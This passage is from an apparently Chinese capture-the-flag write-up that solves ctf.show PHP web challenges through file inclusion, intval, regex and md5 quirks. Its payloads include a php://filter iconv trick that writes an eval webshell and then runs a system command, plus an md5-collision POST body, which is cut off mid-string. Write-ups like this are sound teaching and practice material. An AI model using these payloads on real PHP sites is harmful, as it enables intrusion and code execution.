class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://e0f908bb-f5ab-4fb9-b93b-0b4ee4b943e6.challenge.ctf.show/index.php?file=/var/www/html/index.php</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.2.1002087790.1668386541</span><br><span class="line"><span class="attribute">Range</span><span class="punctuation">: </span>bytes=0-</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;5.mp4&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: video/mp4&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: <span class="subst">$file</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接包含<code>flag.php</code>即可</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?file=/var/www/html/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e0f908bb-f5ab-4fb9-b93b-0b4ee4b943e6.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://e0f908bb-f5ab-4fb9-b93b-0b4ee4b943e6.challenge.ctf.show/index.php?file=/var/www/html/index.php</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.2.1002087790.1668386541</span><br><span class="line"><span class="attribute">Range</span><span class="punctuation">: </span>bytes=0-</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p>转换编码方式即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过一次反转:&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过第二次反转:&quot;</span>.<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="variable">$result</span>);</span><br><span class="line"><span class="comment">/*经过一次反转:?&lt;hp pvela$(P_SO[T]1;)&gt;?</span></span><br><span class="line"><span class="comment">经过第二次反转:&lt;?php eval($_POST[1]);?&gt;*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>contents</code>中字符两两交换</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b2fc01e7-e346-44ec-b5ca-e43faf2c7002.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>33</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">contents</span>=?&lt;hp pvela$(P_SO[T]<span class="number">1</span><span class="comment">;)&gt;?</span></span></span><br></pre></td></tr></table></figure><p>然后访问<code>a.php</code>并<code>POST:1=system(&#39;tac flag.php&#39;);</code>即可</p><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num[]=1</span><br></pre></td></tr></table></figure><blockquote><p>intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</p></blockquote><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数字字母混合或者16进制都可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num=4476a</span><br><span class="line">/?num=0x117c</span><br></pre></td></tr></table></figure><blockquote><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>PHP 4, PHP 5, PHP 7</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int intval ( mixed $var [, int $base = 10 ] )</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>$var：要转换成 integer 的数量值。</li><li>$base：转化所使用的进制。</li></ul><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p><p>最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>字符串有可能返回 0，虽然取决于字符串最左侧的字符。</p></blockquote><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;i表示匹配大小写<br>字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾<br>&#x2F;m 多行匹配 若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配<br>但是当出现换行符 <code>%0a</code>的时候，$cmd的值会被当做两行处理，而此时第二个if正则匹配不符合以php开头和以php结尾</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=php%0a1</span><br></pre></td></tr></table></figure><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num=0x117c</span><br></pre></td></tr></table></figure><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8进制或者小数点都可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num=010574</span><br><span class="line">/?num=4476.1</span><br></pre></td></tr></table></figure><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用八进制，然后前面加个空格使得第一个0的位置变为1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num= 010574</span><br></pre></td></tr></table></figure><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num= 010574</span><br></pre></td></tr></table></figure><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?u=/var/www/html/flag.php</span><br><span class="line">/?u=./flag.php</span><br><span class="line">/?u=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>数组绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p>md5碰撞</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b4cc0806-d909-40ae-9f32-395f4eab09ad.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>627</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">a=<span class="meta">%</span>D<span class="number">89</span><span class="meta">%</span>A<span class="number">4</span><span class="meta">%</span>FD<span class="meta">%</span><span class="number">14</span><span class="meta">%</span>EC<span class="meta">%</span><span class="number">0</span>EL<span class="meta">%</span><span class="number">1</span>A<span class="meta">%</span>FEG<span class="meta">%</span>ED<span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span>D<span class="number">0</span><span class="meta">%</span>C<span class="number">0</span><span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span>CAh<span class="meta">%</span><span class="number">16</span><span class="meta">%</span>B<span class="number">4</span><span class="meta">%</span>DFl<span class="meta">%</span><span class="number">08</span>Z<span class="meta">%</span>FA<span class="meta">%</span><span class="number">1</span>DA<span class="meta">%</span><span class="number">05</span>i<span class="meta">%</span><span class="number">29</span><span class="meta">%</span>C<span class="number">4</span><span class="meta">%</span>FF<span class="meta">%</span><span class="number">80</span><span class="meta">%</span><span class="number">11</span><span class="meta">%</span><span class="number">14</span><span class="meta">%</span>E<span class="number">8</span>jk<span class="number">5</span><span class="meta">%</span><span class="number">0</span>DK<span class="meta">%</span>DAa<span class="meta">%</span>FC<span class="meta">%</span><span class="number">2</span>B<span class="meta">%</span>DC<span class="meta">%</span><span class="number">9</span>F<span class="meta">%</span><span class="number">95</span>ab<span class="meta">%</span>D<span class="number">2</span><span class="meta">%</span><span class="number">09</span>P<span class="meta">%</span>A<span class="number">1</span><span class="meta">%</span><span class="number">5</span>D<span class="meta">%</span><span class="number">12</span><span class="meta">%</span><span class="number">3</span>B<span class="meta">%</span><span class="number">1</span>ETZ<span class="meta">%</span>AA<span class="meta">%</span><span class="number">92</span><span class="meta">%</span><span class="number">16</span>y<span class="meta">%</span><span class="number">29</span><span class="meta">%</span>CC<span class="meta">%</span><span class="number">7</span>DV<span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span>FF<span class="meta">%</span>B<span class="number">8</span>e<span class="meta">%</span><span class="number">7</span>FK<span class="meta">%</span>D<span class="number">6</span><span class="meta">%</span>CD<span class="meta">%</span><span class="number">1</span>D<span class="meta">%</span>DF/a<span class="meta">%</span>DE<span class="meta">%</span><span class="number">27</span><span class="meta">%</span><span class="number">29</span><span class="meta">%</span>EF<span class="meta">%</span><span class="number">08</span><span class="meta">%</span>FC<span class="meta">%</span>C<span class="number">0</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span>D<span class="number">1</span><span class="meta">%</span><span class="number">1</span>B<span class="meta">%</span><span class="number">14</span><span class="meta">%</span>C<span class="number">1</span>LYy<span class="meta">%</span>B<span class="number">2</span><span class="meta">%</span>F<span class="number">9</span><span class="meta">%</span><span class="number">88</span><span class="meta">%</span>DF<span class="meta">%</span>E<span class="number">2</span><span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span><span class="number">9</span>E<span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span><span class="number">04</span>c<span class="meta">%</span>B<span class="number">1</span><span class="meta">%</span>B<span class="number">0</span><span class="meta">%</span>AFj<span class="meta">%</span><span class="number">1</span>E<span class="meta">%</span><span class="number">7</span>Ch<span class="meta">%</span>B<span class="number">0</span><span class="meta">%</span><span class="number">96</span><span class="meta">%</span>A<span class="number">7</span><span class="meta">%</span>E<span class="number">5</span>U<span class="meta">%</span>EB<span class="symbol">n1</span>q<span class="meta">%</span>CA<span class="meta">%</span>D<span class="number">0</span><span class="meta">%</span><span class="number">8</span>B<span class="meta">%</span>C<span class="number">7</span><span class="meta">%</span><span class="number">1</span>BSP&amp;b=<span class="meta">%</span>D<span class="number">89</span><span class="meta">%</span>A<span class="number">4</span><span class="meta">%</span>FD<span class="meta">%</span><span class="number">14</span><span class="meta">%</span>EC<span class="meta">%</span><span class="number">0</span>EL<span class="meta">%</span><span class="number">1</span>A<span class="meta">%</span>FEG<span class="meta">%</span>ED<span class="meta">%</span><span class="number">5</span>B<span class="meta">%</span>D<span class="number">0</span><span class="meta">%</span>C<span class="number">0</span><span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span>CAh<span class="meta">%</span><span class="number">164</span><span class="meta">%</span>DFl<span class="meta">%</span><span class="number">08</span>Z<span class="meta">%</span>FA<span class="meta">%</span><span class="number">1</span>DA<span class="meta">%</span><span class="number">05</span>i<span class="meta">%</span><span class="number">29</span><span class="meta">%</span>C<span class="number">4</span><span class="meta">%</span>FF<span class="meta">%</span><span class="number">80</span><span class="meta">%</span><span class="number">11</span><span class="meta">%</span><span 